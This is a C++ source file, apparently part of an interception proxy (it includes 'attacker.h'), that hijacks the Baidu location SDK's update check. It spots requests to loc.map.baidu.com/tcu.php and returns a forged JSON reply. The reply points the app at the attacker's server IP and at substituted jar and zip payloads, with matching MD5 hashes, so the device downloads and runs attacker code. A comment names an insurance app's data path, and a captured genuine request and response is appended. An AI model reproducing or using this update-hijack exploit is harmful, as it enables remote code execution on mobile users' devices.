#include "BaiduLocation.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"

int BaiduLocation::isBaiduLoc(string url, string host) {
	if (strstr(host.c_str(), "loc.map.baidu.com")) {
		if (strstr(url.c_str(), "/tcu.php?"))
		{
			return TRUE;
		}
	}

	return FALSE;
}


// /data/data/com.pingan.lifeinsurance/files/lldt/
int BaiduLocation::replyBaiduLoc(char *lpbuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {

	string strip = HttpUtils::getIPstr(gServerIP);
	
	char * format = 
		"{\"res\":\"up\",\"upath\":\"%s\","
		"\"u1\":\"locSDK_dex_9.9.9.2.jar\",\"u1_md5\":\"%s\",\"ison\":1,"
		"\"u2\":\"7aso.zip\",\"u2_md5\":\"%s\"}";

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char szfile1md5[256] = { 0 };
	unsigned char hex1md5[256] = { 0 };
	string jarfn = "locSDK_dex_9.9.9.2.jar";
	string filename1 = Public::getPluginPath() + jarfn;
	int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hex1md5, TRUE);

	char szfile2md5[256] = { 0 };
	unsigned char hex2md5[256] = { 0 };
	string zipfn = "7aso.zip";
	string filename2 = Public::getPluginPath() + zipfn;
	int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szfile2md5, hex2md5, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, format, 
		strip.c_str(),
		szfile1md5,szfile2md5);

	int respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return respsize;
}


/*
GET /tcu.php?&it=7ryspfb25_3246Hg-fS78-_7pqjj_-Tporeiu7WX55HY39-t0qCv1aHR1IPQoIDSv8zFv52Zv8rhzLSU2cbCwbm6ub65s7-5tr2x76Lst77N3tmwnoepq4yy5LD4pL-mhp6O3srAwpDEysrZ19LbwtDZx9KDj5falsDehYnUn9ktODtIbQiOZP.. HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Charset: UTF-8;
Host: loc.map.baidu.com
Connection: Keep-Alive
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: text/html
Date: Sun, 15 Mar 2020 09:20:42 GMT
Server: nginx
Content-Length: 187

{"res":"up","upath":"loc.map.baidu.com/tcu","u1":"locSDK_dex_6.2.1.2.jar","u1_md5":"445455d507fe5380057c0fcfd94f46ac","ison":1,
"u2":"7aso.zip","u2_md5":"30ff991b4b3bf8c2feeb1019f8f3f23b"}
*/